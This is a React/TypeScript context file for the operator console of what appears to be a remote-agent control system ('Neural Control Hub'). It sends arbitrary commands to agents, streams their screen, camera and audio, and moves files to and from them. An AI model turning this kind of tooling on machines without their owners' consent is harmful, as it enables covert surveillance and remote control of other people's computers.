import React, { createContext, useContext, useEffect, useState, useCallback } from 'react';
import { io, Socket } from 'socket.io-client';
import apiClient from '../services/api';

interface Agent {
  id: string;
  name: string;
  status: 'online' | 'offline';
  platform: string;
  ip: string;
  lastSeen: Date;
  capabilities: string[];
  performance: {
    cpu: number;
    memory: number;
    network: number;
  };
}

interface Notification {
  id: string;
  type: 'success' | 'warning' | 'error' | 'info';
  title: string;
  message: string;
  timestamp: Date;
  agentId?: string;
  read: boolean;
  category: 'agent' | 'system' | 'security' | 'command';
}

interface SocketContextType {
  socket: Socket | null;
  connected: boolean;
  authenticated: boolean;
  agents: Agent[];
  notifications: Notification[];
  selectedAgent: string | null;
  setSelectedAgent: (agentId: string | null) => void;
  sendCommand: (agentId: string, command: string) => void;
  startStream: (agentId: string, type: 'screen' | 'camera' | 'audio') => void;
  stopStream: (agentId: string, type: 'screen' | 'camera' | 'audio') => void;
  uploadFile: (agentId: string, file: File, destinationPath: string) => void;
  downloadFile: (agentId: string, filename: string) => void;
  commandOutput: string[];
  addCommandOutput: (output: string) => void;
  clearCommandOutput: () => void;
  login: (password: string) => Promise<boolean>;
  logout: () => Promise<void>;
  agentMetrics: Record<string, { cpu: number; memory: number; network: number }>;
}

const SocketContext = createContext<SocketContextType | null>(null);

function bytesToBase64(bytes: Uint8Array): string {
  let binary = '';
  const step = 0x8000;
  for (let i = 0; i < bytes.length; i += step) {
    binary += String.fromCharCode(...bytes.subarray(i, i + step));
  }
  return btoa(binary);
}

function normalizeDestinationDir(destinationPath: string, filename: string): string {
  const raw = (destinationPath || '').trim();
  if (!raw) return '';
  const lower = raw.toLowerCase();
  const filenameLower = filename.toLowerCase();

  if (lower.endsWith(`/${filenameLower}`) || lower.endsWith(`\\${filenameLower}`)) {
    return raw.slice(0, raw.length - filename.length - 1);
  }

  return raw;
}

function extractBase64Payload(value: unknown): string | null {
  if (typeof value !== 'string') return null;
  const trimmed = value.trim();
  if (!trimmed) return null;
  const commaIndex = trimmed.indexOf(',');
  return commaIndex >= 0 ? trimmed.slice(commaIndex + 1) : trimmed;
}

function detectMimeFromBytes(bytes: Uint8Array, filename: string): string {
  const b0 = bytes[0];
  const b1 = bytes[1];
  const b2 = bytes[2];
  const b3 = bytes[3];
  if (b0 === 0xff && b1 === 0xd8 && b2 === 0xff) return 'image/jpeg';
  if (b0 === 0x89 && b1 === 0x50 && b2 === 0x4e && b3 === 0x47) return 'image/png';
  if (b0 === 0x47 && b1 === 0x49 && b2 === 0x46) return 'image/gif';
  if (b0 === 0x1a && b1 === 0x45 && b2 === 0xdf && b3 === 0xa3) return 'video/webm';
  if (b0 === 0x52 && b1 === 0x49 && b2 === 0x46 && b3 === 0x46) {
    if (bytes.length >= 12 && bytes[8] === 0x57 && bytes[9] === 0x45 && bytes[10] === 0x42 && bytes[11] === 0x50) {
      return 'image/webp';
    }
  }
  if (bytes.length >= 12 && bytes[4] === 0x66 && bytes[5] === 0x74 && bytes[6] === 0x79 && bytes[7] === 0x70) {
    return 'video/mp4';
  }

  const name = String(filename || '').toLowerCase();
  const ext = name.includes('.') ? name.split('.').pop()! : '';
  if (ext === 'png') return 'image/png';
  if (ext === 'jpg' || ext === 'jpeg') return 'image/jpeg';
  if (ext === 'gif') return 'image/gif';
  if (ext === 'webp') return 'image/webp';
  if (ext === 'bmp') return 'image/bmp';
  if (ext === 'svg') return 'image/svg+xml';
  if (ext === 'mp4') return 'video/mp4';
  if (ext === 'webm') return 'video/webm';
  if (ext === 'mov') return 'video/quicktime';
  if (ext === 'm4v') return 'video/x-m4v';
  return 'application/octet-stream';
}

function coerceFiniteNumber(value: unknown, fallback = 0): number {
  const num = typeof value === 'number' ? value : Number(value);
  return Number.isFinite(num) ? num : fallback;
}

export function SocketProvider({ children }: { children: React.ReactNode }) {
  const [socket, setSocket] = useState<Socket | null>(null);
  const [connected, setConnected] = useState(false);
  const [authenticated, setAuthenticated] = useState(false);
  const [agents, setAgents] = useState<Agent[]>([]);
  const [notifications, setNotifications] = useState<Notification[]>([]);
  const [selectedAgent, setSelectedAgent] = useState<string | null>(null);
  const [commandOutput, setCommandOutput] = useState<string[]>([]);
  const [agentMetrics, setAgentMetrics] = useState<Record<string, { cpu: number; memory: number; network: number }>>({});

  const addCommandOutput = useCallback((output: string) => {
    console.log('🔍 SocketProvider: addCommandOutput called with:', output);
    setCommandOutput(prev => {
      const newOutput = [...prev.slice(-99), output]; // Keep last 100 lines
      console.log('🔍 SocketProvider: Updated commandOutput array length:', newOutput.length);
      return newOutput;
    });
  }, []);

  const clearCommandOutput = useCallback(() => {
    setCommandOutput([]);
  }, []);

  useEffect(() => {
    // Connect to Socket.IO server
    // If running in production (same origin as backend), use current origin
    // Otherwise use environment variable or localhost for development
    let socketUrl: string;
    
    if (window.location.hostname !== 'localhost' && window.location.hostname !== '127.0.0.1') {
      // Production: use same origin as the current page
      socketUrl = `${window.location.protocol}//${window.location.host}`;
    } else {
      // Development: use environment variable or default to localhost
      socketUrl = (import.meta as any)?.env?.VITE_SOCKET_URL || (window as any)?.__SOCKET_URL__ || 'http://localhost:8080';
    }
    
    console.log('Connecting to Socket.IO server:', socketUrl);
    
    let socketInstance: Socket;
    
    try {
      socketInstance = io(socketUrl, {
        withCredentials: true,
        path: '/socket.io',
        transports: ['websocket', 'polling'],
        timeout: 20000,
        reconnection: true,
        reconnectionAttempts: 5,
        reconnectionDelay: 1000,
      });

      setSocket(socketInstance);
    } catch (error) {
      console.error('Failed to initialize socket connection:', error);
      addCommandOutput(`Connection Error: Failed to initialize socket connection to ${socketUrl}`);
      return;
    }

    // Add debug event listener to see all events
    socketInstance.onAny((eventName, ...args) => {
      console.log(`🔍 SocketProvider: Received event '${eventName}':`, args);
      if (eventName === 'command_result') {
        console.log('🔍 SocketProvider: COMMAND_RESULT EVENT RECEIVED!', args);
        console.log('🔍 SocketProvider: Event data type:', typeof args[0]);
        console.log('🔍 SocketProvider: Event data keys:', Object.keys(args[0] || {}));
      }
    });

    // Connection events
    socketInstance.on('connect', () => {
      setConnected(true);
      console.log('🔍 SocketProvider: Connected to Neural Control Hub');
      
      // Join operators room and request agent list
      socketInstance.emit('operator_connect');
      console.log('🔍 SocketProvider: operator_connect event emitted');
      socketInstance.emit('join_room', 'operators');
      console.log('🔍 SocketProvider: join_room(\"operators\") event emitted');
      
      // Request agent list after a short delay to ensure room joining is complete
      setTimeout(() => {
        console.log('🔍 SocketProvider: Requesting agent list');
        socketInstance.emit('request_agent_list');
      }, 500);
    });

    socketInstance.on('disconnect', (reason) => {
      setConnected(false);
      console.log('Disconnected from Neural Control Hub:', reason);
      addCommandOutput(`Disconnected: ${reason}`);
    });

    socketInstance.on('connect_error', (error) => {
      console.error('Connection error:', error);
      addCommandOutput(`Connection Error: ${error.message || 'Unknown error'}`);
    });

    socketInstance.on('reconnect', (attemptNumber) => {
      console.log('Reconnected after', attemptNumber, 'attempts');
      addCommandOutput(`Reconnected after ${attemptNumber} attempts`);
    });

    socketInstance.on('reconnect_error', (error) => {
      console.error('Reconnection error:', error);
      addCommandOutput(`Reconnection Error: ${error.message || 'Unknown error'}`);
    });

    // Agent management events
    socketInstance.on('agent_list_update', (agentData: Record<string, any>) => {
      try {
        console.log('🔍 SocketProvider: Received agent_list_update:', agentData);
        console.log('🔍 SocketProvider: Agent data keys:', Object.keys(agentData));
        console.log('🔍 SocketProvider: This confirms we are in the operators room!');
        const agentList: Agent[] = Object.entries(agentData).map(([id, data]: [string, any]) => {
          console.log(`Processing agent ${id}:`, data);
          // Safely parse last_seen date
          let lastSeenDate = new Date();
          let isOnline = false;
          
          if (data.last_seen) {
            try {
              lastSeenDate = new Date(data.last_seen);
              const timeDiff = new Date().getTime() - lastSeenDate.getTime();
              isOnline = timeDiff < 60000; // 60 seconds threshold
            } catch (dateError) {
              console.warn(`Invalid date format for agent ${id}: ${data.last_seen}`);
            }
          }
          
          return {
            id,
            name: typeof data?.name === 'string' && data.name.trim() ? data.name : `Agent-${id.slice(0, 8)}`,
            status: isOnline ? 'online' : 'offline',
            platform: typeof data?.platform === 'string' && data.platform.trim() ? data.platform : 'Unknown',
            ip: typeof data?.ip === 'string' && data.ip.trim() ? data.ip : '127.0.0.1',
            lastSeen: lastSeenDate,
            capabilities: Array.isArray(data?.capabilities)
              ? data.capabilities.map((cap: unknown) => String(cap))
              : ['screen', 'commands'],
            performance: {
              cpu: coerceFiniteNumber(data?.cpu_usage ?? data?.performance?.cpu, 0),
              memory: coerceFiniteNumber(data?.memory_usage ?? data?.performance?.memory, 0),
              network: coerceFiniteNumber(data?.network_usage ?? data?.performance?.network, 0)
            }
          };
        });
        console.log('Processed agent list:', agentList);
        setAgents(agentList);
      } catch (error) {
        console.error('Error processing agent list update:', error);
      }
    });

    // Room joining confirmation
    socketInstance.on('joined_room', (room: string) => {
      console.log('🔍 SocketProvider: Successfully joined room:', room);
      if (room === 'operators') {
        console.log('🔍 SocketProvider: SUCCESS! Now in operators room - should receive command results');
      }
    });

    // Command result events
    socketInstance.on('command_result', (data: any) => {
      if (!data || typeof data !== 'object') return;
      const agentTag = typeof data.agent_id === 'string' ? `[${data.agent_id}] ` : '';
      const text =
        typeof data.formatted_text === 'string'
          ? data.formatted_text
          : (typeof data.output === 'string' ? data.output : '');
      if (typeof text === 'string') {
        addCommandOutput(agentTag + text);
      }
    });

    // Legacy command output events (for backward compatibility)
    socketInstance.on('command_output', (data: { agent_id: string; output: string }) => {
      addCommandOutput(`[${data.agent_id}] ${data.output}`);
    });

    // Lightweight telemetry updates from agents
    socketInstance.on('agent_telemetry', (data: { agent_id: string; cpu?: number; memory?: number; network?: number }) => {
      const { agent_id, cpu = 0, memory = 0, network = 0 } = data || ({} as any);
      if (agent_id) {
        setAgentMetrics(prev => ({
          ...prev,
          [agent_id]: { cpu, memory, network }
        }));
        // Also update performance snapshot in agents list if present
        setAgents(prev => prev.map(a => a.id === agent_id ? ({
          ...a,
          performance: {
            cpu: cpu ?? a.performance.cpu,
            memory: memory ?? a.performance.memory,
            network: network ?? a.performance.network,
          }
        }) : a));
      }
    });

    // Streaming events
    socketInstance.on('screen_frame', (data: { agent_id: string; frame: string }) => {
      console.log('📹 SocketProvider: Received screen_frame from agent:', data.agent_id);
      // Handle screen frame updates
      const event = new CustomEvent('screen_frame', { detail: data });
      window.dispatchEvent(event);
    });

    socketInstance.on('camera_frame', (data: { agent_id: string; frame: string }) => {
      console.log('📷 SocketProvider: Received camera_frame from agent:', data.agent_id);
      // Handle camera frame updates
      const event = new CustomEvent('camera_frame', { detail: data });
      window.dispatchEvent(event);
    });

    socketInstance.on('audio_frame', (data: { agent_id: string; frame: string }) => {
      console.log('🎤 SocketProvider: Received audio_frame from agent:', data.agent_id);
      // Handle audio frame updates
      const event = new CustomEvent('audio_frame', { detail: data });
      window.dispatchEvent(event);
    });

    socketInstance.on('agent_notification', (data: any) => {
      try {
        const n: Notification = {
          id: String(data?.id ?? `${Date.now()}`),
          type: String(data?.type ?? 'info') as Notification['type'],
          title: String(data?.title ?? ''),
          message: String(data?.message ?? ''),
          timestamp: new Date(data?.timestamp ?? Date.now()),
          agentId: typeof data?.agent_id === 'string' ? data.agent_id : undefined,
          read: Boolean(data?.read ?? false),
          category: String(data?.category ?? 'agent') as Notification['category'],
        };
        setNotifications(prev => [...prev.slice(-99), n]);
      } catch (e) {
        console.error('Error processing agent_notification:', e, data);
      }
    });

    // File transfer events - Download chunks
    const downloadBuffers: Record<string, { chunksByOffset: Record<number, Uint8Array>, receivedSize: number, totalSize: number }> = {};
    
    socketInstance.on('file_download_chunk', (data: any) => {
      console.log('📥 Received file_download_chunk:', data);
      const fileKey = data?.download_id || data?.filename;
      
      if (data.error) {
        console.error(`Download error: ${data.error}`);
        addCommandOutput(`Download failed: ${data.error}`);
        if (fileKey) delete downloadBuffers[fileKey];
        return;
      }

      const chunkBase64 = extractBase64Payload(data?.chunk ?? data?.data ?? data?.chunk_data);
      if (!chunkBase64) {
        addCommandOutput(`Download failed: Missing chunk data for ${data?.filename || 'unknown file'}`);
        if (fileKey) delete downloadBuffers[fileKey];
        return;
      }

      // Initialize buffer for this file
      if (fileKey && !downloadBuffers[fileKey]) {
        downloadBuffers[fileKey] = { chunksByOffset: {}, receivedSize: 0, totalSize: data.total_size || 0 };
        console.log(`📥 Starting download: ${data.filename} (${data.total_size} bytes)`);
        addCommandOutput(`📥 Downloading: ${data.filename} (${data.total_size} bytes)`);
      }
      
      // Decode base64 chunk
      const binaryString = atob(chunkBase64);
      const bytes = new Uint8Array(binaryString.length);
      for (let i = 0; i < binaryString.length; i++) {
        bytes[i] = binaryString.charCodeAt(i);
      }
      if (fileKey) {
        const buf = downloadBuffers[fileKey];
        const chunkOffset = typeof data?.offset === 'number' ? data.offset : Number(data?.offset);
        if (Number.isFinite(chunkOffset) && chunkOffset >= 0) {
          if (!buf.chunksByOffset[chunkOffset]) {
            buf.chunksByOffset[chunkOffset] = bytes;
            buf.receivedSize += bytes.length;
          }
        }
      }
      
      // Calculate progress
      const totalSize = fileKey ? (data.total_size || downloadBuffers[fileKey].totalSize || 0) : (data.total_size || 0);
      if (fileKey && data.total_size) downloadBuffers[fileKey].totalSize = data.total_size;
      const receivedSize = fileKey ? downloadBuffers[fileKey].receivedSize : 0;
      const progress = totalSize > 0 ? Math.round((receivedSize / totalSize) * 100) : 0;
      console.log(`📊 Download progress: ${data.filename} - ${progress}%`);

      if (data?.download_id && String(data.download_id).startsWith('preview_')) {
        const event = new CustomEvent('file_download_progress', { detail: { ...data, progress } });
        window.dispatchEvent(event);
      }
      
      // Check if download is complete
      if (totalSize > 0 && receivedSize >= totalSize) {
        console.log(`✅ Download complete: ${data.filename}`);
        
        // Combine all chunks into one Uint8Array (exact total_size, exact offsets)
        let combinedArray = new Uint8Array(totalSize);
        if (fileKey) {
          const entries = Object.entries(downloadBuffers[fileKey].chunksByOffset)
            .map(([k, v]) => [Number(k), v] as const)
            .sort((a, b) => a[0] - b[0]);
          for (const [off, chunk] of entries) {
            if (!Number.isFinite(off) || off < 0) continue;
            if (off >= combinedArray.length) continue;
            const remaining = combinedArray.length - off;
            if (chunk.length <= remaining) {
              combinedArray.set(chunk, off);
            } else {
              combinedArray.set(chunk.subarray(0, remaining), off);
            }
          }
        }
        
        const filename = String(data?.filename || 'download');
        const mime = detectMimeFromBytes(combinedArray, filename);
        const blob = new Blob([combinedArray], { type: mime });
        const url = URL.createObjectURL(blob);

        if (data?.download_id && String(data.download_id).startsWith('preview_')) {
          const event = new CustomEvent('file_preview_ready', { detail: { ...data, url, mime } });
          window.dispatchEvent(event);
        } else {
          const a = document.createElement('a');
          a.href = url;
          a.download = filename;
          document.body.appendChild(a);
          a.click();
          document.body.removeChild(a);
          URL.revokeObjectURL(url);
        }
        
        // Clean up
        if (fileKey) delete downloadBuffers[fileKey];
        addCommandOutput(`✅ Downloaded: ${data.filename} (${combinedArray.length} bytes)`);
      }
      
      // Also dispatch custom event for FileManager component
      const event = new CustomEvent('file_download_chunk', { detail: data });
      window.dispatchEvent(event);
    });
    
    // Upload progress events
    socketInstance.on('file_upload_progress', (data: any) => {
      console.log(`📊 Upload progress: ${data.filename} - ${data.progress}%`);
      const event = new CustomEvent('file_upload_progress', { detail: data });
      window.dispatchEvent(event);
    });
    
    socketInstance.on('file_upload_complete', (data: any) => {
      console.log(`✅ Upload complete: ${data.filename} (${data.size} bytes)`);
      addCommandOutput(`✅ Uploaded: ${data.filename} (${data.size} bytes)`);
      const event = new CustomEvent('file_upload_complete', { detail: data });
      window.dispatchEvent(event);
    });
    
    // Download progress events
    socketInstance.on('file_download_progress', (data: any) => {
      console.log(`📊 Download progress: ${data.filename} - ${data.progress}%`);
      const event = new CustomEvent('file_download_progress', { detail: data });
      window.dispatchEvent(event);
    });
    
    socketInstance.on('file_download_complete', (data: any) => {
      console.log(`✅ Download complete: ${data.filename} (${data.size} bytes)`);
      const event = new CustomEvent('file_download_complete', { detail: data });
      window.dispatchEvent(event);
    });

    // WebRTC events
    socketInstance.on('webrtc_stats', (data: any) => {
      console.log('WebRTC Stats:', data);
    });

    socketInstance.on('webrtc_error', (data: { message: string }) => {
      console.error('WebRTC Error:', data.message);
      addCommandOutput(`WebRTC Error: ${data.message}`);
    });

    return () => {
      socketInstance.disconnect();
    };
  }, [addCommandOutput]);

  // Check authentication status on mount
  useEffect(() => {
    const checkAuthStatus = async () => {
      try {
        const response = await apiClient.checkAuthStatus();
        if (response.success && response.data?.authenticated) {
          setAuthenticated(true);
        } else {
          setAuthenticated(false);
        }
      } catch (error) {
        console.error('Failed to check auth status:', error);
        setAuthenticated(false);
      }
    };

    checkAuthStatus();
  }, []);

  const sendCommand = useCallback((agentId: string, command: string) => {
    console.log('🔍 SocketProvider: sendCommand called:', { agentId, command, socket: !!socket, connected });
    
    if (!socket || !connected) {
      console.error('🔍 SocketProvider: Not connected to server');
      addCommandOutput(`Error: Not connected to server`);
      return;
    }
    
    if (!agentId || !command.trim()) {
      console.error('🔍 SocketProvider: Invalid agent ID or command');
      addCommandOutput(`Error: Invalid agent ID or command`);
      return;
    }
    
    try {
      const commandData = { agent_id: agentId, command };
      console.log('🔍 SocketProvider: Emitting execute_command:', commandData);
      socket.emit('execute_command', commandData);
      console.log('🔍 SocketProvider: Command sent successfully');
      // Don't add command to output here - CommandPanel handles it
    } catch (error) {
      console.error('🔍 SocketProvider: Error sending command:', error);
      addCommandOutput(`Error: Failed to send command`);
    }
  }, [socket, connected, addCommandOutput]);

  const startStream = useCallback((agentId: string, type: 'screen' | 'camera' | 'audio') => {
    if (socket && connected) {
      let command = '';
      switch (type) {
        case 'screen':
          command = 'start-stream';
          break;
        case 'camera':
          command = 'start-camera';
          break;
        case 'audio':
          command = 'start-audio';
          break;
      }
      socket.emit('execute_command', { agent_id: agentId, command });
      addCommandOutput(`Starting ${type} stream for ${agentId}`);
    }
  }, [socket, connected, addCommandOutput]);

  const stopStream = useCallback((agentId: string, type: 'screen' | 'camera' | 'audio') => {
    if (socket && connected) {
      let command = '';
      switch (type) {
        case 'screen':
          command = 'stop-stream';
          break;
        case 'camera':
          command = 'stop-camera';
          break;
        case 'audio':
          command = 'stop-audio';
          break;
      }
      socket.emit('execute_command', { agent_id: agentId, command });
      addCommandOutput(`Stopping ${type} stream for ${agentId}`);
    }
  }, [socket, connected, addCommandOutput]);

  const uploadFile = useCallback((agentId: string, file: File, destinationPath: string) => {
    if (!socket || !connected) return;

    const destinationDir = normalizeDestinationDir(destinationPath, file.name);
    addCommandOutput(`Uploading ${file.name} (${file.size} bytes) to ${agentId}:${destinationDir || '(default)'}`);

    const chunkSize = 512 * 1024;

    (async () => {
      for (let offset = 0; offset < file.size; offset += chunkSize) {
        const slice = file.slice(offset, offset + chunkSize);
        const buffer = await slice.arrayBuffer();
        const bytes = new Uint8Array(buffer);
        const chunkB64 = bytesToBase64(bytes);

        socket.emit('upload_file_chunk', {
          agent_id: agentId,
          filename: file.name,
          data: chunkB64,
          chunk: chunkB64,
          chunk_data: chunkB64,
          offset,
          total_size: file.size,
          destination_path: destinationDir
        });
      }

      socket.emit('upload_file_end', {
        agent_id: agentId,
        filename: file.name,
        destination_path: destinationDir
      });
    })().catch((error) => {
      addCommandOutput(`Upload failed: ${error?.message || String(error)}`);
    });
  }, [socket, connected, addCommandOutput]);

  const downloadFile = useCallback((agentId: string, filename: string) => {
    if (socket && connected) {
      const downloadId = `dl_${Date.now()}_${Math.random().toString(16).slice(2)}`;
      socket.emit('download_file', {
        agent_id: agentId,
        filename: filename,
        download_id: downloadId
      });
      addCommandOutput(`Downloading ${filename} from ${agentId}`);
    }
  }, [socket, connected, addCommandOutput]);

  const login = useCallback(async (password: string): Promise<boolean> => {
    try {
      const response = await apiClient.login(password);
      if (response.success) {
        setAuthenticated(true);
        return true;
      }
      return false;
    } catch (error) {
      console.error('Login failed:', error);
      return false;
    }
  }, []);

  const logout = useCallback(async (): Promise<void> => {
    try {
      await apiClient.logout();
    } catch (error) {
      console.error('Backend logout failed (continuing):', error);
    }
    try {
      if (socket) {
        socket.disconnect();
      }
    } catch (e) {
      console.warn('Socket disconnect error:', e);
    }
    setAgents([]);
    setSelectedAgent(null);
    setConnected(false);
    setAuthenticated(false);
    clearCommandOutput();
    try {
      // Redirect to login page (server-rendered)
      window.location.href = '/login';
    } catch {}
  }, [socket, clearCommandOutput]);

  const value: SocketContextType = {
    socket,
    connected,
    authenticated,
    agents,
    selectedAgent,
    setSelectedAgent,
    sendCommand,
    startStream,
    stopStream,
    uploadFile,
    downloadFile,
    commandOutput,
    addCommandOutput,
    clearCommandOutput,
    login,
    logout,
    agentMetrics,
    notifications,
  };

  return (
    <SocketContext.Provider value={value}>
      {children}
    </SocketContext.Provider>
  );
}

export function useSocket() {
  const context = useContext(SocketContext);
  if (!context) {
    throw new Error('useSocket must be used within a SocketProvider');
  }
  return context;
}
